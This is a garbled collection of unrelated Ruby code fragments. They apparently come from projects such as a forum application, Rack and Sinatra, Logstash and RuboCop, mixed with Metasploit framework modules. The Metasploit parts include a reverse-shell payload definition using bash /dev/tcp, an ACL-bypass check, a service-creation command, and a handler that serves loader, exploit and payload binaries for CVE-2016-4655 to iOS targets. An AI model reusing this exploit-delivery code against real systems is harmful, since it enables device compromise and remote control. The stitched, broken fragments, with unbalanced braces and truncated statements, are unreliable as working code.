
        
            def store_optimized_image(file, optimized_image)
      path = get_path_for_optimized_image(optimized_image)
      store_file(file, path)
    end
    
        let(:url) { 'https://github.com/example/example.git' }
    let(:trailing_slash_url) { 'https://github.com/example/example/' }
    let(:ssh_url) { 'git@github.com:example/example.git' }
    let(:branch) { 'dev' }
    
            expect(json).to be_present
        expect(json['js.foo']).to eq('bar')
        expect(json['admin_js.beep']).to eq('boop')
      end
    end
  end
end

    
          expect(event_old_value).to eq(1)
      expect(event_new_value).to eq(2)
      expect(site_setting_value).to eq(2)
    end
    
      def self.views_thresholds
    results = DB.query(<<~SQL)
      SELECT ranked.bucket * 5 as percentile, MIN(ranked.views) as views
      FROM (
        SELECT NTILE(20) OVER (ORDER BY t.views DESC) AS bucket, t.views
        FROM (
          SELECT views
            FROM topics
           WHERE deleted_at IS NULL
             AND archetype <> 'private_message'
             AND visible = TRUE
        ) t
      ) ranked
      WHERE bucket <= 9
      GROUP BY bucket
    SQL
    
    
    {        # Start a new thread and pass the client connection
        # as the input and output pipe.  Client's are expected
        # to implement the Stream interface.
        conn_threads << framework.threads.spawn('BindUdpHandlerSession', false, client) { |client_copy|
          begin
            handle_connection(client_copy, opts)
          rescue
            elog('Exception raised from BindUdp.handle_connection: #{$!}')
          end
        }
      else
        wlog('No connection received before the handler completed')
      end
    }
  end
    
    
    {        This will not work on circa 2009 and older Debian-based Linux
        distributions (including Ubuntu) because they compile bash
        without the /dev/tcp feature.
      },
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd_bash',
      'RequiredCmd'   => 'bash-tcp',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end
    
    require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/bind_tcp_rc4'
    
            By specifying 'pdf' for the URL_TYPE, the module will treat
        the specified URL(s) as PDF documents. The module will
        download the documents and extract the authors' names from the
        document metadata.
    
        if res.body.include?('Administrator')
      vprint_good('ACL bypass successful')
      checkcode = CheckCode::Vulnerable
    else
      vprint_error('ACL bypass unsuccessful')
      return CheckCode::Safe
    end
    
      def on_request_uri(cli, request)
    print_status('Request from #{request['User-Agent']}')
    if request.uri =~ %r{/loader32$}
      print_good('armle target is vulnerable.')
      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'exploit32' )
      loader_data = File.read(local_file, {:mode => 'rb'})
      srvhost = Rex::Socket.resolv_nbo_i(srvhost_addr)
      config = [srvhost, srvport].pack('Nn') + payload_url
      payload_url_index = loader_data.index('PAYLOAD_URL')
      loader_data[payload_url_index, config.length] = config
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      return
    elsif request.uri =~ %r{/loader64$}
      print_good('aarch64 target is vulnerable.')
      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'loader' )
      loader_data = File.read(local_file, {:mode => 'rb'})
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      return
    elsif request.uri =~ %r{/exploit64$}
      local_file = File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4655', 'exploit' )
      loader_data = File.read(local_file, {:mode => 'rb'})
      payload_url_index = loader_data.index('PAYLOAD_URL')
      loader_data[payload_url_index, payload_url.length] = payload_url
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      print_status('Sent exploit (#{loader_data.size} bytes)')
      return
    elsif request.uri =~ %r{/payload32$}
      payload_data = MetasploitPayloads::Mettle.new('arm-iphone-darwin').to_binary :dylib_sha1
      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})
      print_status('Sent payload (#{payload_data.size} bytes)')
      return
    end
    html = %Q^
<html>
<body>
<script>
    
        path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-8464')
    arch = target['Arch'] == ARCH_ANY ? payload.arch.first : target['Arch']
    datastore['EXE::Path'] = path
    datastore['EXE::Template'] = ::File.join(path, 'template_#{arch}_windows.dll')
    
          key = service_create(nam, :path=>'cmd /c \'#{script_on_target}\'',:display=>description)
    
    @@ chat
<pre id='chat'></pre>
<form>
  <input id='msg' placeholder='type message here...' />
</form>
    
        def prefers_plain_text?(env)
      !(Request.new(env).preferred_type('text/plain','text/html') == 'text/html') &&
      [/curl/].index { |item| item =~ env['HTTP_USER_AGENT'] }
    end
    
          def call(env)
        status, headers, body = super
        response = Rack::Response.new(body, status, headers)
        request = Rack::Request.new(env)
        remove_bad_cookies(request, response)
        response.finish
      end
    
            close_body(body) if reaction
    
            post '/', :file => Rack::Test::UploadedFile.new(temp_file.path), :other => '<bar>'
        expect(body).to eq('_escaped_params_tmp_file\nhello world\n&lt;bar&gt;')
      ensure
        File.unlink(temp_file.path)
      end
    end
  end
end

    
        private
    def uncompress(source)
      temporary_directory = Stud::Temporary.pathname
      LogStash::Util::Zip.extract(source, temporary_directory, LOGSTASH_PATTERN_RE)
      temporary_directory
    rescue Zip::Error => e
      # OK Zip's handling of file is bit weird, if the file exist but is not a valid zip, it will raise
      # a `Zip::Error` exception with a file not found message...
      raise InvalidPackError, 'Cannot uncompress the zip: #{source}'
    end
    
        # any errors will be logged to $stderr by invoke!
    # Bundler cannot update and clean gems in one operation so we have to call the CLI twice.
    options = {:update => plugins, :rubygems_source => gemfile.gemset.sources}
    options[:local] = true if local?
    output = LogStash::Bundler.invoke!(options)
    # We currently dont removed unused gems from the logstash installation
    # see: https://github.com/elastic/logstash/issues/6339
    # output = LogStash::Bundler.invoke!(:clean => true)
    display_updated_plugins(previous_gem_specs_map)
  rescue => exception
    gemfile.restore!
    report_exception('Updated Aborted', exception)
  ensure
    display_bundler_output(output)
  end
    
          puts user_feedback_string_for('halting', args[:platform], machines, {'experimental' => experimental})
      options = {:debug => ENV['LS_QA_DEBUG']}
    
    
# This is a non obvious hack,
# EllipticalCurve are not completely implemented in JRuby 9k and the new version of SSH from the standard library
# use them.
#
# Details: https://github.com/jruby/jruby-openssl/issues/105
Net::SSH::Transport::Algorithms::ALGORITHMS.values.each { |algs| algs.reject! { |a| a =~ /^ecd(sa|h)-sha2/ } }
Net::SSH::KnownHosts::SUPPORTED_TYPE.reject! { |t| t =~ /^ecd(sa|h)-sha2/ }
    
          it 'does not care' do
        expect_no_offenses(source)
      end
    end
    
    module RuboCop
  module AST
    # A node extension for `for` nodes. This will be used in place of a plain
    # node when the builder constructs the AST, making its methods available
    # to all `for` nodes within RuboCop.
    class ForNode < Node
      # Returns the keyword of the `for` statement as a string.
      #
      # @return [String] the keyword of the `until` statement
      def keyword
        'for'
      end
    
    module RuboCop
  module AST
    # A node extension for `hash` nodes. This will be used in place of a plain
    # node when the builder constructs the AST, making its methods available
    # to all `hash` nodes within RuboCop.
    class HashNode < Node
      # Returns an array of all the key value pairs in the `hash` literal.
      #
      # @return [Array<PairNode>] an array of `pair` nodes
      def pairs
        each_pair.to_a
      end